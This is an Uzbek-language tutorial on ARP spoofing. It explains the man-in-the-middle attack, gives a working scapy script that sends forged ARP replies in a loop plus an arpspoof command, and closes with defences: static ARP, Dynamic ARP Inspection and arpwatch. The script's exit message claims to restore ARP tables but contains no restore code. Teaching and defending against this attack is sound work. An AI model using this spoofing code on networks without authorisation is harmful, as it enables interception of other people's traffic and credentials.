# ARP Spoofing

Hujumchi yolg'on ARP javob yuborib, trafikni o'ziga yo'naltiradi.

---

## Tushuntirish

```text
Normal:
Victim → Router
Router → Victim

ARP Spoofing:
Victim → Attacker (yolg'on ARP)
Attacker → Router (forward)
```

---

## Hujum qanday ishlaydi?

```text
1. Hujumchi: "Men routerman" (yolg'on ARP reply)
2. Victim: ARP jadvaliga hujumchini router sifatida saqlaydi
3. Victim → Internet trafiki hujumchidan o'tadi
4. Hujumchi: MITM (Man In The Middle)
```

---

## ⚠️ Ogohlantirish

**Faqat o'z tarmog'ingizda sinang!**

Ruxsatsiz ARP spoofing:
- NOJOIY tizimlarga hujum qilish jinoyat
- Faqat o'rganish uchun
- Ruxsatsiz foydalanish qonunan taqiqlangan

---

## Amaliy hujum (o'rganish uchun)

### scapy yordamida

```python
from scapy.all import *
import sys
import time

def arp_spoof(target_ip, gateway_ip):
    """ARP spoofing - faqat o'z tarmog'ingizda sinang!"""
    
    # Target ning MAC adresini olish
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"❌ {target_ip} ning MAC topilmadi")
        return
    
    print(f"[*] Target: {target_ip} ({target_mac})")
    print(f"[*] Gateway: {gateway_ip}")
    
    # Yolg'on ARP reply yuborish
    # Victim ga: "Men gateway man"
    spoofed_pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                       psrc=gateway_ip)
    
    send(spoofed_pkt, verbose=False)
    
    # Gateway ga: "Men victim man"  
    spoofed_pkt2 = ARP(op=2, pdst=gateway_ip, 
                         hwdst=get_mac(gateway_ip),
                         psrc=target_ip)
    send(spoofed_pkt2, verbose=False)

def get_mac(ip):
    """IP dan MAC olish"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(broadcast/arp_request, timeout=3, verbose=False)[0]
    
    if result:
        return result[0][1].hwsrc
    return None

# Ishlatish
if __name__ == "__main__":
    # Faqat o'z tarmog'ingizda sinang!
    TARGET = "192.168.1.100"      # Target qurilma
    GATEWAY = "192.168.1.1"       # Router IP
    
    print("⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!")
    print("⚠️  CTRL+C to'xtatish uchun")
    
    try:
        while True:
            arp_spoof(TARGET, GATEWAY)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] To'xtatildi. ARP jadvalini tiklash...")
```

### arpspoof (ettercap)

```bash
# Interface tanlash
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

---

## Himoya

### 1. Static ARP

```bash
# ARP jadvalini qo'lda qo'shish
sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
```

### 2. Dynamic ARP Inspection (DAI)

```bash
# Switch da DAI yoqish (Cisco)
ip arp inspection vlan 10
ip arp inspection validate src-mac dst-mac ip
```

### 3. ARP monitoring

```bash
# ARP o'zgarishlarini kuzatish
sudo arpwatch -i eth0
```

---

## Xulosa

- ARP spoofing MITM hujumining bir turi
- Yolg'on ARP reply yuborish orqali
- Static ARP, DAI, monitoring bilan himoya qilinadi
